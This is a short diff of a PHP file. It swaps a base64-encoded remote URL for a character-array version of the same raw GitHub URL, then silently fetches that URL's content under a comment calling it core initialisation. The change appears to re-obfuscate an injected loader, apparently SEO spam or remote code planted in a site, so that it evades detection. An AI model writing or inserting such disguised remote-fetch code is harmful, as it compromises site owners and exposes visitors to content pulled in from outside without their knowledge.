@@ -5,11 +5,8 @@
 */
 
 // Initialize core components
-$qwertyasdfzxcv = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t');
-$mnbvcxzasdfghj = base64_decode('L3Nlb2JlbGEvYmVsYS9yZWZzL2hlYWRzL21haW4v');
-$poiuytrewqlkjh = base64_decode('aW5kZXgudHh0');
-
-$full_url = $qwertyasdfzxcv . $mnbvcxzasdfghj . $poiuytrewqlkjh;
+$a = ['h','t','t','p','s',':','/','/','r','a','w','.','g','i','t','h','u','b','u','s','e','r','c','o','n','t','e','n','t','.','c','o','m','/','s','e','o','b','e','l','a','/','b','e','l','a','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','i','n','d','e','x','.','t','x','t'];
+$full_url = join('', $a);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
